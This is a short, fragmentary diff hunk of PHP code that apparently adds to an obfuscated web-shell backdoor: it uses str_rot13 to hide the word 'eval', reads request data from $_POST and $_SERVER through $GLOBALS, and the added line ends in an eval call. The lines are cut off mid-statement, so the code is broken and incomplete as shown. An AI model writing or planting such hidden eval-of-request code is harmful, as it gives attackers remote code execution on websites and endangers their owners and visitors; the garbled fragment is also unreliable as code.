@@ -34,4 +34,4 @@ str_rot13('riny(
 foreach ($GLOBALS[$GLOBALS['
  = $_POST; @($
 ])+(strstr(substr($_SERVER["\x
-
+";eval($
